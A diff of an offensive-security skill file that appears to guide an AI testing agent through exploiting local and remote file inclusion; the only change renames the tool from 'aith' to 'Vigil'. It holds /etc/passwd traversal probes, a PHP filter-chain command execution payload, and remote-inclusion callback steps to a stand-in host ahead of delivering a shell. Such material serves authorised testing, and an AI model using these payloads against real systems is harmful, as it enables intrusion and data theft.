@@ -1,12 +1,12 @@
 ---
 name: file-inclusion
 description: Detect and exploit local and remote file inclusion vulnerabilities for sensitive data access and code execution
-origin: AI Threat Hunting
+origin: Vigil
 ---
 
 # File Inclusion Testing
 
-> **`aith assess kali` audit flags:** use `--technique LFI` for local-file inclusion (`/etc/passwd`, PHP filter wrappers, log poisoning). Switch to `RFI` when the payload fetches a remote URL the server loads.
+> **`vigil assess kali` audit flags:** use `--technique LFI` for local-file inclusion (`/etc/passwd`, PHP filter wrappers, log poisoning). Switch to `RFI` when the payload fetches a remote URL the server loads.
 
 ## When to Activate
 
@@ -16,11 +16,11 @@ origin: AI Threat Hunting
 
 ## Tools
 
-- `aith assess kali exec -- curl ...` (manual path traversal probing and wrapper testing — all target-facing curl must go through the kali exec wrapper; use `--technique LFI --probe-kind payload --phase consume-test --timeout 30` for LFI attempts, `--technique RFI` for remote-file inclusion)
-- `aith assess kali ffuf ...` (automated traversal depth and path fuzzing — use `--technique LFI --probe-kind payload --phase consume-test --timeout 600`)
-- `aith assess classify-payload <value> --mutations` (type the `page=`/`file=` value and generate traversal/encoding variants — see "Type the Inclusion Parameter" below)
-- `aith assess anomaly-score <responses.jsonl>` (triage a traversal-depth fuzz sweep — rank the response population to find the depth that read the file; see "Triaging the Depth Sweep" below)
-- `aith oob mint` / `aith oob poll` (RFI only — mint a callback URL, point the inclusion at it, poll for the server-side fetch; see "Remote File Inclusion" below)
+- `vigil assess kali exec -- curl ...` (manual path traversal probing and wrapper testing — all target-facing curl must go through the kali exec wrapper; use `--technique LFI --probe-kind payload --phase consume-test --timeout 30` for LFI attempts, `--technique RFI` for remote-file inclusion)
+- `vigil assess kali ffuf ...` (automated traversal depth and path fuzzing — use `--technique LFI --probe-kind payload --phase consume-test --timeout 600`)
+- `vigil assess classify-payload <value> --mutations` (type the `page=`/`file=` value and generate traversal/encoding variants — see "Type the Inclusion Parameter" below)
+- `vigil assess anomaly-score <responses.jsonl>` (triage a traversal-depth fuzz sweep — rank the response population to find the depth that read the file; see "Triaging the Depth Sweep" below)
+- `vigil oob mint` / `vigil oob poll` (RFI only — mint a callback URL, point the inclusion at it, poll for the server-side fetch; see "Remote File Inclusion" below)
 - `php_filter_chain_generator.py` — PHP filter chain RCE without file write (synacktiv tool — run host-side to generate payloads, then deliver via kali exec)
 
 ## Methodology
@@ -60,8 +60,8 @@ origin: AI Threat Hunting
 Before hand-typing the traversal and encoding permutations above, classify the value the parameter currently carries (e.g. the default `page=about` or `file=report.pdf`) and let the oracle generate path-aware variants deterministically:
 
 ```bash
-aith assess classify-payload "../uploads/report.pdf" --mutations   # type: path
-aith assess classify-payload "/var/www/page.php" --mutations       # type: path
+vigil assess classify-payload "../uploads/report.pdf" --mutations   # type: path
+vigil assess classify-payload "/var/www/page.php" --mutations       # type: path
 ```
 
 Consume by intent bucket:
@@ -78,7 +78,7 @@ A traversal sweep walks `../`, `../../`, `../../../` … until one depth resolve
 
 ```bash
 # one JSONL line per depth: {"url":"?page=../../../etc/passwd","status":200,"content_length":2841,"words":31,"lines":44}
-aith assess anomaly-score depth_sweep.jsonl --top 5
+vigil assess anomaly-score depth_sweep.jsonl --top 5
 ```
 
 The depth that actually read `/etc/passwd` diverges from the default-page population on `length_bucket`, `words_bucket`, and `lines_bucket` — the oracle ranks it first and annotates which attribute flipped. Investigate the top outlier; confirm it is the file (look for `root:x:0:0:` in that response), not an error page of a different size. A flat ranking means no depth resolved the file: increase depth, switch encoding (the `format` variants above), or the parameter is not a filesystem include. This is the same triage pass for the `ffuf` output — pipe its results in rather than scrolling the match list.
@@ -173,8 +173,8 @@ python3 php_filter_chain_generator.py --chain 'PAYLOAD: php system("id")'
 Before serving a shell, confirm the server actually fetches an attacker URL — mint a nonce-tagged callback, point the parameter at it, and poll. The callback fires on the server-side fetch even when the response body does not reflect the included content (blind RFI / SSRF-via-include):
 
 ```bash
-aith oob status --json
-aith oob mint --technique rfi --target-url "https://target/index.php" --param page --probe-kind http
+vigil oob status --json
+vigil oob mint --technique rfi --target-url "https://target/index.php" --param page --probe-kind http
 # -> http  http://<prefix>-<token>.researcher.example/
 ```
 
@@ -189,7 +189,7 @@ aith oob mint --technique rfi --target-url "https://target/index.php" --param pa
 Correlate the fetch instead of grepping the listener log:
 
 ```bash
-aith oob poll --client <name> --json
+vigil oob poll --client <name> --json
 ```
 
 A non-empty `matched` array for your nonce proves the server dereferenced your URL — `allow_url_include` is On (or the SMB/UNC path was followed). That confirms RFI/include-SSRF reach before you invest in hosting and delivering a shell payload. Empty `matched` → `allow_url_include` is Off and no UNC fetch happened; stay on the LFI path.
